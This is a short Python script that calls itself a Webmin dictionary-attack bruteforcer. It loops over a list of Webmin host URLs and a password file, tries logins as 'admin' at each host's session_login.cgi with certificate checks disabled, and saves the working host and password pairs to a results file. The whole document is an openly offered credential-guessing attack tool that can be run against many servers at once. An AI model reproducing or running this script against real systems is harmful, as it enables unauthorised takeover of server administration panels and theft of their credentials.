#!/usr/bin/python3
"""
Webmin Dictionary-Attack Bruteforcer
Coded by StYl3z for FXP-TERMiNAL.iNFO use
Proof of Concept work. :)
"""
import requests
requests.packages.urllib3.disable_warnings()
def bruteforce():
    agent = {'User-Agent':'Hackmin Bruteforcer Version 1.0 by SpliTerZ'}
    FAiLED = "Login failed. Please try again."
    passwords = open('dictionary.txt','r',encoding="utf8").read().splitlines() 
    webmins = open('webmins.txt','r').read().splitlines()   
    for webmin in webmins:        
            for password in passwords:
                LoginData = { 'user':'admin','pass':password}
                loginpage = webmin+"/session_login.cgi"
                r = requests.Session()
                r.get(loginpage,verify=False)
                login = r.post(loginpage,data=LoginData,verify=False,headers=agent)                
                if not FAiLED in login.content.decode('utf-8') or 'Access denied for' in login.content.decode('utf-8'):
                    results = open('bruted_webmin.txt','a')
                    results.write(loginpage+" Login: admin/"+password+"\n")
                    results.close()
                    print("Password "+password+"valid!\n")
                    break
                elif 'Access denied for' in login.content.decode('utf-8'):
                    break
bruteforce()           